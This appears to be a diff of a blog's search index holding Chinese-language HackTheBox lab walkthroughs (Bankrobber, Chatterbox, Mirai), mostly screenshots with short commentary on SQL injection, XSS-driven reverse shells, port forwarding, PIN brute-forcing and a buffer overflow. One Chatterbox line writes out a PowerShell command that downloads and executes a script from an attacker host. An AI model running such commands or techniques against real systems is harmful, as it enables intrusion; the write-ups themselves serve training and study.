+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.742wm5r8em40.webp"
+                     
+                ></p>
+<p>有sql注入</p>
+<p>数据库并并没有发现有利用价值的信息，尝试一下用sql注入读取文件</p>
+<p>先确定一下目录路径</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.1nbi564ns5uo.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.2rcbss3r9hw0.webp"
+                     
+                ></p>
+<p>知道了路径后进行读取</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.6z6k1tcawmo0.webp"
+                     
+                ></p>
+<p>读取一下查询后门那个php文件，看下源码</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.6z6k1tcawmo0.webp"
+                     
+                ></p>
+<p>貌似是无法从web端绕过了</p>
+<p>尝试用xss进行一个绕过执行</p>
+<p><code>https://stackoverflow.com/questions/6396101/pure-javascript-send-post-data-without-a-form</code></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.1n2qnxruwl34.webp"
+                     
+                ></p>
+<p>修改一下这段javascript代码</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.1g67txuge83k.webp"
+                     
+                ></p>
+<p>把content-type类型修改为与web请求一致的类型</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.2dohqeo3sat.webp"
+                     
+                ></p>
+<p>之后让其post请求命令执行的php文件地址，在将执行的参数修改为powershell远程加载反弹shell</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.6ivpm3bpb6o0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.7kdr1vru0o00.webp"
+                     
+                ></p>
+<p>同样进行url编码后发送</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.3d56mwkzxxk0.webp"
+                     
+                ></p>
+<p>本地监听</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.2rd7flbdgfo.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.1uft0b1p40w0.webp"
+                     
+                ></p>
+<p>提权</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.d7zp70dn4c0.webp"
+                     
+                ></p>
+<p>提权检测脚本未检测出可利用的提权方法</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.2olkglpq32k0.webp"
+                     
+                ></p>
+<p>发现一个奇怪的910端口，他是开放的，但无法访问也没有被扫描到</p>
+<p>将其映射到本地访问，使用chisel进行端口映射</p>
+<p><code>https://github.com/jpillora/chisel</code></p>
+<p>下载windows和linux两个文件</p>
+<p>将windows的上传到靶机</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.2tld39wquvq0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.9hajlros1zo.webp"
+                     
+                ></p>
+<p>powershell执行不了，msf生一个反弹shell，弹一个cmd的回来</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.1031vqvrsyls.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.7hkc093g5d80.webp"
+                     
+                ></p>
+<p>访问本地9910看下</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.1e04vq4yxzs0.webp"
+                     
+                ></p>
+<p>貌似不是直接web请求，nc尝试一下</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.17vvdm0b89i8.webp"
+                     
+                ></p>
+<p>需要一个密码</p>
+<p>四位密码，尝试爆破一下</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.51g49uar1uw0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.76xlqplxta00.webp"
+                     
+                ></p>
+<p>密码为0021</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.2aw9hrg5rh5w.webp"
+                     
+                ></p>
+<p>又要输入一个数字</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.3nt3frb3zpw0.webp"
+                     
+                ></p>
+<p>貌似执行了一个文件</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.1cn02ns8xlts.webp"
+                     
+                ></p>
+<p>但是无权修改</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.6x7yhwtauks0.webp"
+                     
+                ></p>
+<p>貌似这里可以进行覆盖，达到让其任意执行的目的，但不知道具体到多少才会覆盖</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.483llismymc0.webp"
+                     
+                ></p>
+<p>好嘛，玩崩了</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.40vr4g5skkq0.webp"
+                     
+                ></p>
+<p>得到最大值为32，32以后的地方就会被覆盖</p>
+<p>让其执行msf的反弹shell</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.1libjs435j0g.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.132yvldh0asg.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.5askizlbt680.webp"
                      
                 ></p>
 ]]></content>
@@ -3100,146 +3100,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title>Chatterbox - HackTheBox</title>
-    <url>/post/c089cde000c7/</url>
-    <content><![CDATA[<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.7jwiq8vcwjc0.webp"
-                     
-                ></p>
-<p>nmap扫描</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.2kvnnvyqwcs0.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.5qfe212zjj40.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.4afl8ap43d40.webp"
-                     
-                ></p>
-<p>9255和9256端口显示为同一个服务，访问看看</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.5dmvh3p55sc0.webp"
-                     
-                ></p>
-<p>9255访问为空</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.50vjfhjwgvg0.webp"
-                     
-                ></p>
-<p>9256也不知道是个啥，搜一下有无exp</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.2ksb564dg1i0.webp"
-                     
-                ></p>
-<p>一个缓冲区溢出漏洞</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.130awguikay.webp"
-                     
-                ></p>
-<p>还给了生成方法，修改一下</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.5exxuddt8280.webp"
-                     
-                ></p>
-<p>修改为用powershell远程请求本地的反弹shell文件</p>
-<p>exploit-db给的python脚本那就是死活没用啊，换了一个github的脚本</p>
-<p><code>https://github.com/mpgn/AChat-Reverse-TCP-Exploit</code></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.5k6zobm7wyk0.webp"
-                     
-                ></p>
-<p>把ip也修改一下</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.r9lr7cj5y4w.webp"
-                     
-                ></p>
-<p>提权</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.6oud2h2h8bw0.webp"
-                     
-                ></p>
-<p>提权脚本检测了一下，基本是没有可利用的</p>
-<p>利用powerup检测一下，发现当前用户的密码</p>
-<p><code>powershell.exe -nop -exec bypass -c &quot;iex(new-object system.net.webclient).downloadstring(&#39;http://10.10.14.17/PowerUp.ps1&#39;)&quot;</code></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.qgy8vsx541s.webp"
-                     
-                ></p>
-<p>尝试用这个密码切换一下用户</p>
-<p><code>https://stackoverflow.com/questions/15895877/how-to-switch-current-user-using-powershell</code></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.6arrkdd4vbg0.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.4u8kflh1ba80.webp"
-                     
-                ></p>
-<p>修改一下</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.5ucl5u4zqg80.webp"
-                     
-                ></p>
-<p>依次执行</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.6kq9u0gaj7k0.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.2rmkg5iaeds0.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.1lhfnaom3y68.webp"
-                     
-                ></p>
-]]></content>
-      <tags>
-        <tag>Hack-The-Box</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Cronos - HackTheBox</title>
     <url>/post/d7494865a491/</url>
     <content><![CDATA[<p><img  
@@ -3422,6 +3282,146 @@
       </tags>
   </entry>
   <entry>
+    <title>Chatterbox - HackTheBox</title>
+    <url>/post/c089cde000c7/</url>
+    <content><![CDATA[<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.7jwiq8vcwjc0.webp"
+                     
+                ></p>
+<p>nmap扫描</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.2kvnnvyqwcs0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.5qfe212zjj40.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.4afl8ap43d40.webp"
+                     
+                ></p>
+<p>9255和9256端口显示为同一个服务，访问看看</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.5dmvh3p55sc0.webp"
+                     
+                ></p>
+<p>9255访问为空</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.50vjfhjwgvg0.webp"
+                     
+                ></p>
+<p>9256也不知道是个啥，搜一下有无exp</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.2ksb564dg1i0.webp"
+                     
+                ></p>
+<p>一个缓冲区溢出漏洞</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.130awguikay.webp"
+                     
+                ></p>
+<p>还给了生成方法，修改一下</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.5exxuddt8280.webp"
+                     
+                ></p>
+<p>修改为用powershell远程请求本地的反弹shell文件</p>
+<p>exploit-db给的python脚本那就是死活没用啊，换了一个github的脚本</p>
+<p><code>https://github.com/mpgn/AChat-Reverse-TCP-Exploit</code></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.5k6zobm7wyk0.webp"
+                     
+                ></p>
+<p>把ip也修改一下</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.r9lr7cj5y4w.webp"
+                     
+                ></p>
+<p>提权</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.6oud2h2h8bw0.webp"
+                     
+                ></p>
+<p>提权脚本检测了一下，基本是没有可利用的</p>
+<p>利用powerup检测一下，发现当前用户的密码</p>
+<p><code>powershell.exe -nop -exec bypass -c &quot;iex(new-object system.net.webclient).downloadstring(&#39;http://10.10.14.17/PowerUp.ps1&#39;)&quot;</code></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.qgy8vsx541s.webp"
+                     
+                ></p>
+<p>尝试用这个密码切换一下用户</p>
+<p><code>https://stackoverflow.com/questions/15895877/how-to-switch-current-user-using-powershell</code></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.6arrkdd4vbg0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.4u8kflh1ba80.webp"
+                     
+                ></p>
+<p>修改一下</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.5ucl5u4zqg80.webp"
+                     
+                ></p>
+<p>依次执行</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.6kq9u0gaj7k0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.2rmkg5iaeds0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Chatterbox/image.1lhfnaom3y68.webp"
+                     
+                ></p>
+]]></content>
+      <tags>
+        <tag>Hack-The-Box</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Delivery - HackTheBox</title>
     <url>/post/9ef8c7d2ce46/</url>
     <content><![CDATA[<p><img  
@@ -3534,7 +3534,7 @@
                      data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Delivery/image.7dhthjgbrsw0.webp"
                      
                 ></p>
-<p>尝试用那个<a class="link"   href="mailto:&#55;&#x37;&#x34;&#57;&#x39;&#x36;&#51;&#x40;&#x64;&#x65;&#108;&#x69;&#118;&#101;&#x72;&#x79;&#x2e;&#104;&#116;&#x62;" >&#55;&#x37;&#x34;&#57;&#x39;&#x36;&#51;&#x40;&#x64;&#x65;&#108;&#x69;&#118;&#101;&#x72;&#x79;&#x2e;&#104;&#116;&#x62;<i class="fas fa-external-link-alt"></i></a>票据邮箱注册一下</p>
+<p>尝试用那个<a class="link"   href="mailto:&#x37;&#55;&#52;&#x39;&#x39;&#54;&#x33;&#64;&#x64;&#x65;&#108;&#x69;&#x76;&#x65;&#x72;&#x79;&#46;&#104;&#x74;&#x62;" >&#x37;&#55;&#52;&#x39;&#x39;&#54;&#x33;&#64;&#x64;&#x65;&#108;&#x69;&#x76;&#x65;&#x72;&#x79;&#46;&#104;&#x74;&#x62;<i class="fas fa-external-link-alt"></i></a>票据邮箱注册一下</p>
 <p><img  
                      lazyload
                      alt="image"
@@ -9024,183 +9024,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Mirai - HackTheBox</title>
-    <url>/post/d7b4657d7cb8/</url>
-    <content><![CDATA[<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.56z44c422ts0.webp"
-                     
-                ></p>
-<p>nmap扫描</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.tfvsmwysf1s.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.6ef7h5z4wi0.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.7769oc0inhs0.webp"
-                     
-                ></p>
-<p>访问80</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.sda9rry6zds.webp"
-                     
-                ></p>
-<p>啥也没有，看看32400</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.11yegjhm0gls.webp"
-                     
-                ></p>
-<p>一个登录框</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.737oxzuh6e40.webp"
-                     
-                ></p>
-<p>弱口令不行，爆破也不行，扫个目录看看</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.7c7xnl05rw40.webp"
-                     
-                ></p>
-<p>gobuster报错了，加个-b 401即可</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.305rxbmgt540.webp"
-                     
-                ></p>
-<p>扫出了挺多，但访问起来都是</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.5fzctx9qoog0.webp"
-                     
-                ></p>
-<p>再回80扫个目录看看</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.5exckpr0xlg0.webp"
-                     
-                ></p>
-<p>有个admin</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.jw8s0923k0w.webp"
-                     
-                ></p>
-<p>树莓派？</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.3r4xcc41oga0.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.67hbabn8te40.webp"
-                     
-                ></p>
-<p>密码不知道，看看有无公开可利用exp</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.4i0flsy3nva0.webp"
-                     
-                ></p>
-<p>要cookie，利用不了，搜一下有无默认密码</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.5mmx3gywpi40.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.4ywn8r79izc0.webp"
-                     
-                ></p>
-<p>还是不对，但树莓派好像会有ssh用户，利用默认账号和密码尝试登陆一下</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.86pwdr3jum0.webp"
-                     
-                ></p>
-<p>提权</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.55rowm2wxd80.webp"
-                     
-                ></p>
-<p>有这么直接的嘛</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.5pmu3bglwe80.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.45dx91ozjw80.webp"
-                     
-                ></p>
-<p>肯定没这么简单，他说他有U盘备份，直接用<code>df -h</code>找一下挂载磁盘</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.6y04a6ntmcs0.webp"
-                     
-                ></p>
-<p>看到一个usbstick</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.3j31qetjysi0.webp"
-                     
-                ></p>
-<p>脑筋急转弯了属于是</p>
-<p>由于linux系统，删除文件并不是真正的将文件从磁盘中抹除，而是将其索引抹除，导致无法查找与查看，可以使用<code>strings /dev/sdb</code>，查看被删除的数据，<code>/dev/sdb</code>是挂载U盘的磁盘名</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.5b439a5p30w0.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.6u479as4ya80.webp"
-                     
-                ></p>
-]]></content>
-      <tags>
-        <tag>Hack-The-Box</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Netmon - HackTheBox</title>
     <url>/post/51fbd6a339b6/</url>
     <content><![CDATA[<p><img  
@@ -9507,6 +9330,183 @@
                      lazyload
                      alt="image"
                      data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Networked/image.qe3g7mmy428.webp"
+                     
+                ></p>
+]]></content>
+      <tags>
+        <tag>Hack-The-Box</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Mirai - HackTheBox</title>
+    <url>/post/d7b4657d7cb8/</url>
+    <content><![CDATA[<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.56z44c422ts0.webp"
+                     
+                ></p>
+<p>nmap扫描</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.tfvsmwysf1s.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.6ef7h5z4wi0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.7769oc0inhs0.webp"
+                     
+                ></p>
+<p>访问80</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.sda9rry6zds.webp"
+                     
+                ></p>
+<p>啥也没有，看看32400</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.11yegjhm0gls.webp"
+                     
+                ></p>
+<p>一个登录框</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.737oxzuh6e40.webp"
+                     
+                ></p>
+<p>弱口令不行，爆破也不行，扫个目录看看</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://cdn.jsdelivr.net/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Mirai/image.7c7xnl05rw40.webp"
+                     
